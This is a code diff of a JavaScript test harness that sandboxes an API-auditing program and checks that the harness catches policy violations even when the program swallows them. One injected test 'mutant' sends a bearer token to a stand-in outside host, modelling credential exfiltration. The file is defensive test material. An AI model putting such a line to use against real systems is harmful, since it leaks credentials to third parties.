@@ -54,24 +54,44 @@ async function execute(options = {}) {
   const output = [];
   const errors = [];
   const summaries = [];
+  const violations = [];
+  const observations = [];
+  const check = (condition, label) => { if (!condition) violations.push(label); };
   const env = { SENTRY_AUTH_TOKEN: PRIVATE, GITHUB_STEP_SUMMARY: 'synthetic-summary' };
   if (options.noToken) delete env.SENTRY_AUTH_TOKEN;
   const process = { env, exitCode: 0 };
   const context = {
-    appendFileSync: (destination, value) => { assert.equal(destination, 'synthetic-summary'); summaries.push(value); },
+    appendFileSync: (destination, value) => {
+      check(destination === 'synthetic-summary', 'summary_path_mismatch');
+      summaries.push(value);
+    },
     createHash, process, Buffer, URL, Date: options.Date ?? Date,
-    AbortSignal: { timeout: ms => { assert.ok(ms > 0 && ms <= 15000); return undefined; } },
+    AbortSignal: { timeout: ms => {
+      check(Number.isInteger(ms) && ms > 0 && ms <= 15000, 'unbounded_timeout');
+      return undefined;
+    } },
     console: { log: value => output.push(value), error: value => errors.push(value) },
     fetch: async (url, init) => {
-      assert.ok(url.startsWith(API), 'no external destination request');
-      assert.equal(init.method, 'GET');
-      assert.equal(init.redirect, 'error');
-      assert.deepEqual(Object.keys(init.headers), ['Authorization']);
-      assert.equal(init.headers.Authorization, 'Bearer ' + PRIVATE);
-      const route = url.slice(API.length);
+      const atFixedApi = typeof url === 'string' && url.startsWith(API);
+      const route = atFixedApi ? url.slice(API.length) : '<external-destination>';
       calls.push(route);
+      const headerNames = Object.keys(init?.headers ?? {});
+      const observed = Object.freeze({
+        atFixedApi, methodIsGet: init?.method === 'GET', redirectsRejected: init?.redirect === 'error',
+        headerShapeValid: headerNames.length === 1 && headerNames[0] === 'Authorization',
+        tokenMatches: init?.headers?.Authorization === 'Bearer ' + PRIVATE,
+      });
+      observations.push(observed);
+      check(observed.atFixedApi, 'external_destination');
+      check(observed.methodIsGet, 'non_get_method');
+      check(observed.redirectsRejected, 'redirect_allowed');
+      check(observed.headerShapeValid, 'unexpected_headers');
+      check(observed.tokenMatches, 'authorization_mismatch');
       const value = options.resolve?.(route, entries, calls) ?? entries.get(route);
-      assert.ok(value, 'unexpected fixed endpoint/cursor ' + route);
+      if (!value) {
+        check(false, 'unexpected_request');
+        throw new Error('UNEXPECTED_FIXTURE_REQUEST');
+      }
       if (value.throw) throw new Error(PRIVATE);
       if (value.response) return value.response;
       const headers = { 'content-type': 'application/json' };
@@ -79,16 +99,50 @@ async function execute(options = {}) {
       return new Response(value.raw ?? JSON.stringify(value.data), { status: value.status ?? 200, headers });
     },
   };
-  const task = vm.runInNewContext(program, context, { timeout: 2000 });
+  const subject = options.mutateProgram ? options.mutateProgram(program) : program;
+  const task = vm.runInNewContext(subject, context, { timeout: 2000 });
   await task;
+  // These assertions must run outside every catch in the evaluated program.
+  assert.deepEqual(violations, [], 'sandbox policy violations: ' + violations.join(','));
   const text = [...output, ...errors, ...summaries].join('\n');
   assert.ok(!text.includes(PRIVATE), 'private provider fields/token must never reach output');
   assert.ok(!text.includes(fixtureUrl), 'collector URL must never reach output');
-  return { code: process.exitCode, result: output.length ? JSON.parse(output[0]) : null, calls, errors, summaries, text };
+  return { code: process.exitCode, result: output.length ? JSON.parse(output[0]) : null,
+    calls: Object.freeze([...calls]), observations: Object.freeze([...observations]), errors, summaries, text };
+}
+const policyMutants = [
+  ['external_destination', "await fetch('https://outside.example.test/', { method: 'GET', redirect: 'error', headers: { Authorization: 'Bearer ' + token } });"],
+  ['non_get_method', "await fetch(API, { method: 'POST', redirect: 'error', headers: { Authorization: 'Bearer ' + token } });"],
+  ['redirect_allowed', "await fetch(API, { method: 'GET', redirect: 'follow', headers: { Authorization: 'Bearer ' + token } });"],
+  ['authorization_mismatch', "await fetch(API, { method: 'GET', redirect: 'error', headers: { Authorization: 'wrong' } });"],
+  ['unexpected_headers', "await fetch(API, { method: 'GET', redirect: 'error', headers: { Authorization: 'Bearer ' + token, Extra: 'synthetic' } });"],
+  ['unexpected_request', "await fetch(API + 'unsupported-fixture/', { method: 'GET', redirect: 'error', headers: { Authorization: 'Bearer ' + token } });"],
+  ['summary_path_mismatch', "appendFileSync('unexpected-summary', 'synthetic');"],
+  ['unbounded_timeout', 'AbortSignal.timeout(15001);'],
+];
+for (const [violation, statement] of policyMutants) {
+  test('harness rejects caught policy mutant: ' + violation, async () => {
+    await assert.rejects(execute({
+      // This case already expects the audit to fail. The extra policy violation
+      // must fail the harness even when the evaluated program catches it.
+      configure: rows => rows.set(P.rules, { status: 403, data: PRIVATE }),
+      mutateProgram: code => {
+        const marker = 'const read = reader(token);';
+        assert.equal(code.split(marker).length, 2);
+        return code.replace(marker, 'try { ' + statement + ' } catch {}\n' + marker);
+      },
+    }), error => {
+      assert.match(error.message, /sandbox policy violations/);
+      assert.ok(error.message.includes(violation));
+      return true;
+    });
+  });
 }
 test('all required inventories succeed; safe rule/action and destination evidence only', async () => {
   const value = await execute();
   assert.equal(value.code, 0);
+  assert.equal(value.observations.length, value.calls.length);
+  assert.ok(Object.isFrozen(value.observations[0]));
   assert.equal(value.result.readAccessVerified, true);
   const config = value.result.configuration;
   assert.equal(config.readComplete, true);
